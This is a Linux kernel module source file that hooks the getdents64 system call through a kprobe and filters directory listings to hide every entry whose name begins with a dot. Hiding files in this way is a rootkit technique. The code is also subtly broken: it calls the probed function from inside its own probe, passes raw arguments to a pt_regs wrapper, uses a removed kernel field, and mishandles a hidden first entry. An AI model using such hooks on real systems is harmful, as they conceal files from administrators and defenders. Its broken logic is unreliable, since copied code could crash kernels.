#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/slab.h>

static struct kprobe kp;
static unsigned long getdents64_addr = 0;

struct linux_dirent64 {
	u64        d_ino;
	s64        d_off;
	unsigned short d_reclen;
	unsigned char  d_type;
	char       d_name[];
};

/* The real getdents64 system call pointer */
static asmlinkage long (*real_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);

/* Modified getdents64 with filtering logic */
static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

/* Pre-handler: Intercepts the getdents64 call and replaces it with our hooked version */
int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	unsigned int fd = (unsigned int)regs->di;    // First argument: file descriptor
	struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->si; // Second argument: dirp (directory entries buffer)
	unsigned int count = (unsigned int)regs->dx; // Third argument: count (buffer size)

	printk(KERN_INFO "kprobe: Intercepting getdents64 (fd=%u, count=%u)\n", fd, count);

	/* Replace the real getdents64 system call with our hooked version */
	regs->ax = hooked_getdents64(fd, dirp, count);

	return 1;  // Returning 1 indicates to skip the execution of the original system call
}

/* Post-handler: This will be called after `getdents64` is executed, but since we are replacing the call in pre-handler, it's unused here */
void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
	printk(KERN_INFO "kprobe: getdents64 post-handler (unused in this example)\n");
}

/* Fault-handler: Called if there's an error during the probe */
int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
{
	printk(KERN_ERR "kprobe: Fault occurred at getdents64\n");
	return 0;
}

/* Hooked getdents64: Modifies the behavior of the original system call */
static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
	long ret;
	struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker;
	unsigned long offset = 0;

	/* Call the real getdents64 system call */
	ret = real_getdents64(fd, dirp, count);
	if (ret <= 0)
		return ret;

	/* Allocate kernel memory to modify the directory entries */
	dirent_ker = kzalloc(ret, GFP_KERNEL);
	if (!dirent_ker)
		return ret;

	/* Copy directory entries from user space */
	if (copy_from_user(dirent_ker, dirp, ret)) {
		kfree(dirent_ker);
		return ret;
	}

	/* Traverse directory entries and filter out entries starting with '.' */
	previous_dir = NULL;
	while (offset < ret) {
		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
		offset += current_dir->d_reclen;

		/* Hide files that start with '.' */
		if (current_dir->d_name[0] == '.') {
			if (previous_dir)
				previous_dir->d_reclen += current_dir->d_reclen;
			else
				ret -= current_dir->d_reclen;
		} else {
			previous_dir = current_dir;
		}
	}

	/* Copy the modified directory entries back to user space */
	if (copy_to_user(dirp, dirent_ker, ret)) {
		kfree(dirent_ker);
		return ret;
	}

	kfree(dirent_ker);
	return ret;
}

/* Module initialization */
static int __init kprobe_init(void)
{
	int ret;

	/* Register kprobe for getdents64 system call */
	kp.symbol_name = "__x64_sys_getdents64";  // Function name to probe
	kp.pre_handler = handler_pre;
	kp.post_handler = handler_post;
	kp.fault_handler = handler_fault;

	/* Register the kprobe */
	ret = register_kprobe(&kp);
	if (ret < 0) {
		printk(KERN_ERR "kprobe: Failed to register kprobe, error: %d\n", ret);
		return ret;
	}

	/* Store the real getdents64 address */
	real_getdents64 = (void *)kp.addr;
	printk(KERN_INFO "kprobe: Registered on getdents64 at address: 0x%lx\n", (unsigned long)real_getdents64);

	/* Now we are ready to replace getdents64 with our hooked function */
	return 0;
}

/* Module cleanup */
static void __exit kprobe_exit(void)
{
	unregister_kprobe(&kp);
	printk(KERN_INFO "kprobe: Unregistered\n");
}

module_init(kprobe_init);
module_exit(kprobe_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Kprobe example to hook and modify getdents64 using struct pt_regs");
